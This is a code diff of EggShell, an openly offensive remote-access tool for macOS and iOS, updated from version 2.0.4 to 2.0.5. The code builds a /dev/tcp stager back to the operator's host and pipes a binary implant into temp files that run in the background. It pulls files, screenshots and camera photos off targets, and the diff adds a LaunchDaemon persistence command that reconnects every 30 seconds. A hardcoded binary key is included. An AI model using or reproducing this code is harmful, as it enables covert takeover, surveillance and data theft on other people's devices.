@@ -1,20 +1,28 @@
 #EggShell
 #Created By lucas.py 8-18-16
-import os,base64,random,string,socket,sys,time,binascii
+debug = 0
+
+import base64
+import binascii
+import os
+import random
+import string
+import socket
+import sys
+import time
 from StringIO import StringIO
 from threading import Thread
+from src.encryption.ESEncryptor import ESEncryptor
+
+#MARK: Globals
+TERM = "EOF6D2ONE"
+shellKey = ''.join((random.choice(string.letters+string.digits+"*")) for x in range(32))
+escrypt = ESEncryptor(shellKey,16)
+sessions = {}
+
+#MARK: UI
 RED = '\033[1;91m'
 ENDC = '\033[0m'
-try:
-    from Crypto import Random
-    from Crypto.Cipher import AES
-except:
-    print RED+"Make sure you have pycrypto installed\nTry running 'easy_instal pycrypto'"+ENDC
-    exit()
-
-debug = 0
-TERM = "EOF6D2ONE"
-homeDir = os.getcwd()+"/"
 UNDERLINE_GREEN = '\033[4;92m'
 GREEN = '\033[1;92m'
 WHITE = '\033[0;97m'
@@ -31,133 +39,46 @@ BANNER_ART_TEXT = GREEN+"""
  _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
 |_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                     l
-"""+WHITE+"\nVersion: 2.0.4\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
+"""+WHITE+"\nVersion: 2.0.5\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
 BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     1): Start Server
     2): Start Multi Session
     3): Create Payload
     4): Exit
 """ + WHITE + "-"*40
-MENU = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
+BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
 
-sessions = {}
 
-OSX_BINARY = "resources/esplosx"
-iOS_BINARY = "resources/esplios"
-#LINUX_BINARY = "resources/esplinux"
-nesProDylib = "resources/eggshellPro.dylib"
-#MARK: AES Encryption
 
-#A random encryption key is created every time eggshell.py is run
-def createKey():
-    if debug:
-        return "12345678123456781234567812345678"
-    chars = string.letters + string.digits + "*"
-    return ''.join((random.choice(chars)) for x in range(32))
+def interactiveMenu():
+    while 1:
+        os.system('clear')
+        option = raw_input(BANNER)
+        choose = {
+            "1" : menuStartServer,
+            "2" : menuStartMultiServer,
+            "3" : menuCreateScript,
+            "4" : menuExit
+        }
+        try:
+            choose[option]()
+            os.system('clear')
+        except KeyError:
+            continue
 
 #generate key/define global
-shellKey = createKey()
+
 #binary key is used to decrypt the encrypted shell key, exists inside binaries as well
 binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"
 
-#PKCS7Encoding
-class PKCS7Encoder(object):
-    def __init__(self, k=16):
-        self.k = k
-    
-    ## @param text The padded text for which the padding is to be removed.
-    # @exception ValueError Raised when the input padding is missing or corrupt.
-    def decode(self, text):
-        nl = len(text)
-        val = int(binascii.hexlify(text[-1]), 16)
-        if val > self.k:
-            raise ValueError('Input is not padded or padding is corrupt')
-        
-        l = nl - val
-        return text[:l]
-    
-    ## @param text The text to encode.
-    def encode(self, text):
-        l = len(text)
-        output = StringIO()
-        val = self.k - (l % self.k)
-        for _ in xrange(val):
-            output.write('%02x' % val)
-        return text + binascii.unhexlify(output.getvalue())
-
-encoder = PKCS7Encoder()
-
-#decrypt files that were sent from targets
-def decryptFile(filein, fileout, password,fileSize, key_length=16):
-    iv = "\x00" * 16
-    aes = AES.new(password, AES.MODE_CBC, iv)
-    
-    print strinfo("decrypting file")
-
-    #encodepadding
-    in_file = open(filein,"rb")
-    encryptedData = in_file.read()
-    pad_text = encoder.encode(encryptedData)
-    in_file.close()
-
-    #decrypt,get length
-    decryptedData = aes.decrypt(pad_text)
-    dataSize = len(decryptedData)
-    
-    offset = dataSize - fileSize
-    
-    if offset < 0:
-        print strinfo("error decrypting data :(")
-
-    #write data subtracting the offset
-    out_file = open(fileout,'a+b')
-    out_file.write(decryptedData[:-offset])
-    out_file.close()
-
-#Our AES Encryption Class
-class AESEncryption:
-    def __init__(self, key=None, BS=None):
-        self.key = key
-        self.pkcs7 = PKCS7Encoder()
-        self.BS = (BS if BS else None)
-    
-    def decode(self, encodedEncrypted, BS=16):
-        if self.key is None:
-            raise ValueError("key is required")
-    
-        BS = (self.BS if self.BS else BS)
-        cipher = AES.new(self.key)
-        
-        decrypted = cipher.decrypt(base64.b64decode(encodedEncrypted))[:BS]
-
-        for i in range(1, len(base64.b64decode(encodedEncrypted)) / BS):
-            cipher = AES.new(self.key, AES.MODE_CBC,
-                             base64.b64decode(encodedEncrypted)[(i - 1) * BS:i * BS])
-            decrypted += cipher.decrypt(base64.b64decode(encodedEncrypted)[i * BS:])[:BS]
-
-        return self.pkcs7.decode(decrypted)
-
-    def encode(self, raw, BS=16):
-        if self.key is None:
-            raise ValueError("key is required")
-                    
-        BS = (self.BS if self.BS else BS)
-                        
-        cipher = AES.new(self.key)
-        encoded = self.pkcs7.encode(raw)
-        encrypted = cipher.encrypt(encoded)
-                                    
-        return base64.b64encode(encrypted)
-
 #TODO: should really take out whitespace eventually
-def encryptStr(string,key=shellKey):
-    aesx = AESEncryption(key,16)
+def encryptStr(string,cypter=escrypt):
     length = len(string)
     result = ""
     x = 0
     while x < length:
         chunk = string[x:x+12]
-        result += aesx.encode(chunk)
+        result += cypter.encode(chunk)
         x+=12
     return result
 
@@ -171,10 +92,6 @@ def bben(data):
 
 def bbde(data):
     return base64.b64decode(data)
-
-#MARK: Interactive EggShell
-
-#local commands
 
 def showLocalHelp():
     print WHITEBU+"Local Commands:"+"\n"+ENDC
@@ -234,6 +151,8 @@ def showHelp(CDA):
         showCommand("dial","dial number on device")
         showCommand("listapps","list bundle identifiers")
         showCommand("open","open app")
+        showCommand("persistence","installs LaunchDaemon - tries to connect every 30 seconds")
+        showCommand("rmpersistence","uninstalls LaunchDaemon")
         showCommand("installpro","installs eggshellpro to device")
         print "\n"+WHITEBU+"eggshellPro Commands:"+"\n"+ENDC
         showCommand("lock","simulate lock button press")
@@ -272,10 +191,6 @@ def lcd(command):
         except:
             print strinfo("directory not found")
 
-def lpwd():
-    os.system('pwd')
-
-
 #MARK: Interactive Shell
 
 def initSHELL(name,conn,host,port,CDA):
@@ -309,11 +224,10 @@ def initSHELL(name,conn,host,port,CDA):
                 conn.send(encryptStr(command))
                 downloadFile(command,conn)
                 continue
-
         if args[0] == "download" or args[0] == "picture" or args[0] == "frontcam" or args[0] == "backcam" or args[0] == "screenshot":
             downloadFile(command,conn)
         elif args[0] == "installpro":
-            uploadFile(nesProDylib,"/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",conn)
+            uploadFile("resources/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",conn)
         elif args[0] == "help":
             showHelp(CDA)
         elif args[0] == "clear":
@@ -328,7 +242,7 @@ def initSHELL(name,conn,host,port,CDA):
             lcd(command)
             continue
         elif args[0] == "lpwd":
-            lpwd()
+            os.system('pwd')
             continue
         elif args[0] == "alert":
             title = bben(raw_input("Set title: "))
@@ -355,7 +269,6 @@ def sendCMD(cmd,conn):
 
 def receiveString(conn):
 #    try:
-        aesx = AESEncryption(shellKey,16)
         data = ""
         while 1:
             data += conn.recv(2048)
@@ -365,7 +278,7 @@ def receiveString(conn):
             #useful for getting however much data we want
             if TERM in data:
                 data = data.replace(TERM,"")
-                result = bbde(aesx.decode(data))
+                result = bbde(escrypt.decode(data))
                 if result == "-1":
                     result = "invalid command"
                 return result
@@ -440,7 +353,7 @@ def downloadFile(command,conn):
         filename = command[9:]
 
     progress = 0
-    file = open(homeDir+".tmpfile", "a+b")
+    file = open(os.getcwd()+"/.tmpfile", "a+b")
     #read stream into file
     while 1:
         #TODO: there is a small chance EOF will be miss-aligned, need to fix this
@@ -461,8 +374,9 @@ def downloadFile(command,conn):
             #decrypt with our shell key, remove tmp file
             downloadedFile = open(filename,"wb")
             downloadedFile.close()
-            decryptFile(homeDir+".tmpfile",filename,shellKey,sizeofFile)
-            os.remove(homeDir+".tmpfile")
+            if not escrypt.decryptFile(os.getcwd()+"/.tmpfile", filename, shellKey, sizeofFile):
+                print strinfo("error decrypting data :(")
+            os.remove(os.getcwd()+"/.tmpfile")
             print strinfo("Finished Downloading!")
             return
         else:
@@ -553,7 +467,7 @@ class SessionHandler:
         self.host = host
         self.port = port
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
-        INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey,binaryKey))
+        INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey,ESEncryptor(binaryKey,16)))
         INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -593,14 +507,14 @@ class SessionHandler:
         if "i386" in CDA:
             if verbose:
                 print strinfo("Detected OSX")
-            binaryFile = open(OSX_BINARY, "rb")
+            binaryFile = open("src/binaries/esplosx", "rb")
             payload = binaryFile.read()
             binaryFile.close()
             preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
         elif "arm" in CDA:
             if verbose:
                 print strinfo("Detected iOS")
-            binaryFile = open(iOS_BINARY, "rb")
+            binaryFile = open("src/binaries/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
             preload = "rm /private/var/tmp/espl 2> /dev/null;cat >/private/var/tmp/espl;chmod +x /private/var/tmp/espl;/private/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
@@ -610,7 +524,7 @@ class SessionHandler:
             conn.close()
             exit()
             return
-            binaryFile = open(LINUX_BINARY, "rb")
+            binaryFile = open("src/binaries/esplinux", "rb")
             payload = binaryFile.read()
             binaryFile.close()
             preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod +x /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
@@ -622,7 +536,6 @@ class SessionHandler:
             return
         
         if verbose:
-            print strinfo("Waiting For Target...")
             print strinfo("Sending Payload")
         conn.send(preload)
         conn.send(payload)
@@ -683,6 +596,7 @@ def multiServerListSessions():
 
 #TODO: finish this function lol
 def multiServerExit(bgserver):
+    #clean up
     for key,value in sessions.iteritems():
         if value.name:
             try:
@@ -708,7 +622,6 @@ def multiServerController(port,bgserver):
         if not input:
             continue
         cmd = input.split()
-
         #commands
         if cmd[0] == "interact":
             multiServerSessionInteract(cmd)
@@ -725,30 +638,11 @@ def multiServerController(port,bgserver):
             print "invalid command"
     interactiveMenu()
 
-
-#MARK: Main Menu functions
-
-def interactiveMenu():
-    ERROR = ""
-    while 1:
-        os.system('clear')
-        option = raw_input(ERROR+MENU)
-        choose = {
-            "1" : menuStartServer,
-            "2" : menuStartMultiServer,
-            "3" : menuCreateScript,
-            "4" : menuExit
-        }
-        try:
-            choose[option]()
-            os.system('clear')
-        except KeyError:
-            ERROR = ""
-            if option != '':
-                ERROR = "invalid option\n"
-
 def main():
-    interactiveMenu()
+    #main menu options
+    try:
+        interactiveMenu()
+    except (KeyboardInterrupt, EOFError) as e:
+        print ""
 
-if __name__=="__main__":
-    main()
+main()
